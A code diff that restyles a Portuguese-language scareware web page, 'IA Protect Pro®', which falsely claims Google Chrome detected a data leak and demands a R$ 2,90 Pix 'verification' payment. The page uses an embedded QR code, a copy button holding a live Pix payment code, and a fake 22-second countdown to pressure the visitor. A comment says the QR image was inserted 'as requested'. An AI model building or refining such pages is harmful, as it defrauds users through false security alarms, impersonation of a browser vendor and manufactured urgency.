@@ -5,40 +5,37 @@
   <title>IA Protect Pro®</title>
   <style>
     body {
-      background-color: #f4f4f4;
       font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
       text-align: center;
       padding: 30px;
     }
     h1 {
-      color: #222;
-      margin-top: 15px;
+      font-size: 28px;
+      margin-bottom: 10px;
     }
-    .warning {
+    .alerta {
       color: red;
       font-weight: bold;
+      margin-bottom: 20px;
     }
-    .pix {
-      font-size: 18px;
+    .pix-valor {
       font-weight: bold;
-      margin: 20px 0;
+      font-size: 18px;
+      margin-top: 20px;
     }
-    .note {
+    .expira {
+      color: #d00;
       font-size: 12px;
-      color: #555;
+      margin-top: 20px;
     }
-    .expire {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #b00;
-    }
-    .pix-btn {
-      background-color: #222;
-      color: white;
+    .copiar-btn {
+      background-color: #333;
+      color: #fff;
       padding: 10px 20px;
-      font-size: 15px;
       border: none;
-      border-radius: 5px;
+      border-radius: 4px;
+      margin-top: 15px;
       cursor: pointer;
     }
   </style>
@@ -46,19 +43,21 @@
 <body>
   <h1>🔒 IA Protect Pro®</h1>
   <h2>Segurança de conexão ativada</h2>
-  <p class="warning">⚠️ Vazamento de dados em potencial detectado.</p>
+  <p class="alerta">⚠️ Vazamento de dados em potencial detectado.</p>
   <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
 
-  <p class="pix">🔐 Valor único de verificação: R$ 2,90</p>
-  <p class="note">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
+  <p class="pix-valor">🔐 Valor único de verificação: R$ 2,90</p>
+  <p style="font-size: 11px; color: #777;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <!-- QR CODE EMBUTIDO -->
-  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANoAAADcCAIAAACZJiiRAAEAAElEQVR4nKS9d4wdV5Yefm9VvZxj55wjc45ilESNRmGk0cxO2PUGDLxYrxeG7T9s2AZsA4YB4wcYhhfG7mJ3Zz0zmqBRpkiKFHMmRXaT3Wx2zt2vu1/O71XV/f3xsS4vmxrN7vj90Wg236tXde+5J3znO+fQcqkgKwqllBCJEEIIYYzphMlUYowxxiil+EWSJPxO/ikvvF+SJEKIruuMMVmWxf/F" alt="QR Code" width="220" height="220" />
+  <!-- IMAGEM DO QR CODE INSERIDA CONFORME SOLICITADO -->
+  <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..." alt="QR Code" width="220" height="220">
 
   <br><br>
-  <button class="pix-btn" onclick="navigator.clipboard.writeText('00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB')">Copiar código Pix</button>
+  <button class="copiar-btn" onclick="navigator.clipboard.writeText('00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB')">
+    Copiar código Pix
+  </button>
 
-  <p class="expire">⏳ Sua autenticação expira em 22 segundos.</p>
+  <p class="expira">⏳ Sua autenticação expira em 22 segundos.</p>
 </body>
 </html>
